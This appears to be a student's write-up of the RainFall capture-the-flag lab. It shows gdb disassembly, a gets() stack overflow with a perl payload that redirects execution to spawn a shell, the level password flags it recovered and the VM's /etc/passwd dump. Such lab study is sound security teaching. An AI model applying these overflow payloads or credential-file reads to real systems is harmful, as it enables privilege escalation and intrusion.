# RainFall

#### [Subject pdf](https://cdn.intra.42.fr/pdf/pdf/7092/fr.subject.pdf)

#### [Download ISO](https://projects.intra.42.fr/uploads/document/document/331/RainFall.iso)

## Level0

```asm
(gdb) disas main
Dump of assembler code for function main:
   0x08048ec0 <+0>:	push   %ebp
   0x08048ec1 <+1>:	mov    %esp,%ebp
   0x08048ec3 <+3>:	and    $0xfffffff0,%esp
   0x08048ec6 <+6>:	sub    $0x20,%esp
   0x08048ec9 <+9>:	mov    0xc(%ebp),%eax
   0x08048ecc <+12>:	add    $0x4,%eax
   0x08048ecf <+15>:	mov    (%eax),%eax
   0x08048ed1 <+17>:	mov    %eax,(%esp)
   0x08048ed4 <+20>:	call   0x8049710 <atoi>
   0x08048ed9 <+25>:	cmp    $0x1a7,%eax
   0x08048ede <+30>:	jne    0x8048f58 <main+152>
   0x08048ee0 <+32>:	movl   $0x80c5348,(%esp)
   0x08048ee7 <+39>:	call   0x8050bf0 <strdup>
   0x08048eec <+44>:	mov    %eax,0x10(%esp)
   0x08048ef0 <+48>:	movl   $0x0,0x14(%esp)
   0x08048ef8 <+56>:	call   0x8054680 <getegid>
   0x08048efd <+61>:	mov    %eax,0x1c(%esp)
   0x08048f01 <+65>:	call   0x8054670 <geteuid>
   0x08048f06 <+70>:	mov    %eax,0x18(%esp)
   0x08048f0a <+74>:	mov    0x1c(%esp),%eax
   0x08048f0e <+78>:	mov    %eax,0x8(%esp)
   0x08048f12 <+82>:	mov    0x1c(%esp),%eax
   0x08048f16 <+86>:	mov    %eax,0x4(%esp)
   0x08048f1a <+90>:	mov    0x1c(%esp),%eax
   0x08048f1e <+94>:	mov    %eax,(%esp)
   0x08048f21 <+97>:	call   0x8054700 <setresgid>
   0x08048f26 <+102>:	mov    0x18(%esp),%eax
   0x08048f2a <+106>:	mov    %eax,0x8(%esp)
   0x08048f2e <+110>:	mov    0x18(%esp),%eax
   0x08048f32 <+114>:	mov    %eax,0x4(%esp)
   0x08048f36 <+118>:	mov    0x18(%esp),%eax
   0x08048f3a <+122>:	mov    %eax,(%esp)
   0x08048f3d <+125>:	call   0x8054690 <setresuid>
   0x08048f42 <+130>:	lea    0x10(%esp),%eax
   0x08048f46 <+134>:	mov    %eax,0x4(%esp)
   0x08048f4a <+138>:	movl   $0x80c5348,(%esp)
   0x08048f51 <+145>:	call   0x8054640 <execv>
   0x08048f56 <+150>:	jmp    0x8048f80 <main+192>
   0x08048f58 <+152>:	mov    0x80ee170,%eax
   0x08048f5d <+157>:	mov    %eax,%edx
   0x08048f5f <+159>:	mov    $0x80c5350,%eax
   0x08048f64 <+164>:	mov    %edx,0xc(%esp)
   0x08048f68 <+168>:	movl   $0x5,0x8(%esp)
   0x08048f70 <+176>:	movl   $0x1,0x4(%esp)
   0x08048f78 <+184>:	mov    %eax,(%esp)
   0x08048f7b <+187>:	call   0x804a230 <fwrite>
   0x08048f80 <+192>:	mov    $0x0,%eax
   0x08048f85 <+197>:	leave
   0x08048f86 <+198>:	ret
End of assembler dump.
```

```bash
level0@RainFall:~$ ./level0
Segmentation fault (core dumped)

level0@RainFall:~$ ./level0 1
No !
```

```bash
level0@RainFall:~$ ./level0 423
$ whoami
level1
```

```bash
level0@RainFall:~$ ./level0 423
$ bash
bash: /home/user/level0/.bashrc: Permission denied
level1@RainFall:~$ cd /home/user/level1
level1@RainFall:/home/user/level1$ ls -la
total 17
dr-xr-x---+ 1 level1 level1   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level1 level1  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level1 level1 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level2 users  5138 Mar  6  2016 level1
-rw-r--r--+ 1 level1 level1   65 Sep 23  2015 .pass
-rw-r--r--  1 level1 level1  675 Apr  3  2012 .profile

level1@RainFall:/home/user/level1$ cat .pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```

## Level1

- [Why gets() should not be used](https://stackoverflow.com/questions/1694036/why-is-the-gets-function-so-dangerous-that-it-should-not-be-used)

```bash
evel1@RainFall:~$ gdb ./level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.
(gdb) disas main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   %ebp
   0x08048481 <+1>:     mov    %esp,%ebp
   0x08048483 <+3>:     and    $0xfffffff0,%esp
   0x08048486 <+6>:     sub    $0x50,%esp ; Reserve 50 bytes on the stack
   0x08048489 <+9>:     lea    0x10(%esp),%eax
   0x0804848d <+13>:    mov    %eax,(%esp) ; Load $esp address in $eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt> ; call gets with the buffer address to the stack
   0x08048495 <+21>:    leave
   0x08048496 <+22>:    ret
```

```bash
level1@RainFall:~$ ./level1 <<< '123456789 123456789 123456789 123456789 123456789 123456789 123456789 123456'
Illegal instruction (core dumped)

level1@RainFall:~$ ./level1 <<< '123456789 123456789 123456789 123456789 123456789 123456789 123456789 12345'
```

When running `objdump -d ./level1`, a `run` function using `system()` is showing.

- [objdump output](http://ix.io/2bqM)

When trying to run it in gdb, the function spawns a shell

```bash
level1@RainFall:~$ gdb ./level1
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /home/user/level1/level1...(no debugging symbols found)...done.

(gdb) break *0x0804848d
Breakpoint 1 at 0x804848d

(gdb) run
Starting program: /home/user/level1/level1

Breakpoint 1, 0x0804848d in main ()
(gdb) set $eip = 0x^CQuit

(gdb) info registers
eax            0xbffff690       -1073744240
ecx            0xbffff774       -1073744012
edx            0xbffff704       -1073744124
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff680       0xbffff680
ebp            0xbffff6d8       0xbffff6d8
esi            0x0      0
edi            0x0      0
eip            0x804848d        0x804848d <main+13>
eflags         0x200282 [ SF IF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51

(gdb) set $eip = 0x8048444

(gdb) continue
Continuing.
Good... Wait what?
$ whoami
level1
```

## Overwriting $EIP

- [Example tutorial](https://www.go4expert.com/articles/stack-overflow-eip-overwrite-basics-t24917/)

When giving a long string as arguments, we can see we can overwrite the $eip register

```bash
(gdb) run <<< 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
Starting program: /home/user/level1/level1 <<< 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
eax            0xbffff690       -1073744240
ecx            0xb7fd28c4       -1208145724
edx            0xbffff690       -1073744240
ebx            0xb7fd0ff4       -1208152076
esp            0xbffff6e0       0xbffff6e0
ebp            0x41414141       0x41414141
esi            0x0      0
edi            0x0      0
eip            0x41414141       0x41414141
eflags         0x210282 [ SF IF RF ID ]
cs             0x73     115
ss             0x7b     123
ds             0x7b     123
es             0x7b     123
fs             0x0      0
gs             0x33     51
```

The next step is to try to overwrite `$eip` with the address of the `run` function found in the binary previously

```bash
# The first 4 bytes are for $ebp and the other 4 for $eip
level1@RainFall:~$ ./level1  <<< `perl -e 'print "A"x72'`$(echo -n -e "\xd8\xf6\xff\xbf\x44\x84\x04\x8")
Good... Wait what?
Segmentation fault (core dumped)

level1@RainFall:~$ perl -e 'print "A"x72' > /tmp/lol

level1@RainFall:~$ echo -n -e "\xd8\xf6\xff\xbf\x44\x84\x04\x8" >> /tmp/lol

level1@RainFall:~$ cat /tmp/lol  | ./level1 
Good... Wait what?
Segmentation fault (core dumped)

level1@RainFall:~$ cat /tmp/lol - | ./level1 
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

- [Stack base overflow tutorial](https://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/)

![](https://www.corelan.be/wp-content/uploads/2010/09/image_thumb24.png)

## Level2

```bash
gdb-peda$ disas main
Dump of assembler code for function main:
   0x0804853f <+0>:     push   ebp
   0x08048540 <+1>:     mov    ebp,esp
   0x08048542 <+3>:     and    esp,0xfffffff0
   0x08048545 <+6>:     call   0x80484d4 <p>
   0x0804854a <+11>:    leave
   0x0804854b <+12>:    ret
End of assembler dump.
```

```bash
gdb-peda$ disas p
Dump of assembler code for function p:
   0x080484d4 <+0>:     push   ebp ; ASM Prologue
   0x080484d5 <+1>:     mov    ebp,esp ; ASM Prologue
   0x080484d7 <+3>:     sub    esp,0x68 ; Allocates 104 bytes on the stack
   0x080484da <+6>:     mov    eax,ds:0x8049860 ; x/100x 0x8049860 -> 0x8049860 <stdout@@GLIBC_2.0> (take stdout fileno from data segment https://stackoverflow.com/questions/30050527/meaning-of-ds-in-assembly-language)
   0x080484df <+11>:    mov    DWORD PTR [esp],eax ; set 1st argument of fflush() to *eax (STDOUT_FILENO)
   0x080484e2 <+14>:    call   0x80483b0 <fflush@plt> ; fflush(STDOUT_FILENO);
   0x080484e7 <+19>:    lea    eax,[ebp-0x4c] ; Point eax to (ebp - 76) (28nth byte of the stack)
   0x080484ea <+22>:    mov    DWORD PTR [esp],eax ; Save eax
   0x080484ed <+25>:    call   0x80483c0 <gets@plt> ; Call gets()
   0x080484f2 <+30>:    mov    eax,DWORD PTR [ebp+0x4] ; Set eax to return value of gets()
   0x080484f5 <+33>:    mov    DWORD PTR [ebp-0xc],eax ; Set 92nth byte of the stack as eax
   0x080484f8 <+36>:    mov    eax,DWORD PTR [ebp-0xc] ; Set eax as 92nth byte of the stack
   0x080484fb <+39>:    and    eax,0xb0000000 ; Apply bitmask eax & 0xb0000000
   0x08048500 <+44>:    cmp    eax,0xb0000000 ; Check if higher byte of eax is >= '0xb0' && < '0xc0'
   0x08048505 <+49>:    jne    0x8048527 <p+83> ; If it\'s the case continue, print the string w/ printf() & exit, else goto <p+83>

   0x08048507 <+51>:    mov    eax,0x8048620 ; gdb$ printf "%s", 0x8048620 -> "(%p)"
   0x0804850c <+56>:    mov    edx,DWORD PTR [ebp-0xc] ; Set the 92nth byte of the stack as edx
   0x0804850f <+59>:    mov    DWORD PTR [esp+0x4],edx ; Set edx as 2nd argument
   0x08048513 <+63>:    mov    DWORD PTR [esp],eax ; Set eax as 1st argument
   0x08048516 <+66>:    call   0x80483a0 <printf@plt> ; Call printf("(%p)", ebp-0xc (ebp - 12 / 92th byte));
   0x0804851b <+71>:    mov    DWORD PTR [esp],0x1 ; Set 1 as 1st argument of exit()
   0x08048522 <+78>:    call   0x80483d0 <_exit@plt> ; Call exit()

   0x08048527 <+83>:    lea    eax,[ebp-0x4c] ; Set eax to 28nth byte of the stack
   0x0804852a <+86>:    mov    DWORD PTR [esp],eax ; Set 1st argument of puts to eax
   0x0804852d <+89>:    call   0x80483f0 <puts@plt> ; Call puts
   0x08048532 <+94>:    lea    eax,[ebp-0x4c] ; Set eax to 28nth byte of the stack
   0x08048535 <+97>:    mov    DWORD PTR [esp],eax ; Set 1st argument of strdup() to eax
   0x08048538 <+100>:   call   0x80483e0 <strdup@plt> ; Call strdup()

   0x0804853d <+105>:   leave ; ASM Epilogue
   0x0804853e <+106>:   ret ; ASM Epilogue
End of assembler dump.

gdb-peda$ printf "%s", 0x8048620
(%p) 
```

## Misc

### ASM Cheatsheets

- [Registers usage](http://6.s081.scripts.mit.edu/sp18/x86-64-architecture-guide.html)

- [ASM Operations](https://cs.brown.edu/courses/cs033/docs/guides/x64_cheatsheet.pdf)

- [Linux Syscall Table](https://filippo.io/linux-syscall-table/)

- [Att vs Intel syntax](https://imada.sdu.dk/~kslarsen/Courses/dm546-2019-spring/Material/IntelnATT.htm)

![](https://www.tortall.net/projects/yasm/manual/html/objfmt-win64/calling-convention.png)

- [Linux program startup](http://dbp-consulting.com/tutorials/debugging/linuxProgramStartup.html)

![](http://dbp-consulting.com/tutorials/debugging/images/callgraph.png)

### ASM Returns

```asm
lea    eax,[ebp-0x4c]
```

![](https://itandsecuritystuffs.files.wordpress.com/2014/03/image_thumb2.png?w=617&h=480)

### /etc/passwd content

```bash
level0@RainFall:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:106::/var/run/dbus:/bin/false
whoopsie:x:103:107::/nonexistent:/bin/false
landscape:x:104:110::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
ft_root:x:1000:1000:ft_root,,,:/home/ft_root:/bin/bash
level0:x:2020:2020::/home/user/level0:/bin/bash
level1:x:2030:2030::/home/user/level1:/bin/bash
level2:x:2021:2021::/home/user/level2:/bin/bash
level3:x:2022:2022::/home/user/level3:/bin/bash
level4:x:2025:2025::/home/user/level4:/bin/bash
level5:x:2045:2045::/home/user/level5:/bin/bash
level6:x:2064:2064::/home/user/level6:/bin/bash
level7:x:2024:2024::/home/user/level7:/bin/bash
level8:x:2008:2008::/home/user/level8:/bin/bash
level9:x:2009:2009::/home/user/level9:/bin/bash
bonus0:x:2010:2010::/home/user/bonus0:/bin/bash
bonus1:x:2011:2011::/home/user/bonus1:/bin/bash
bonus2:x:2012:2012::/home/user/bonus2:/bin/bash
bonus3:x:2013:2013::/home/user/bonus3:/bin/bash
end:x:2014:2014::/home/user/end:/bin/bash
```
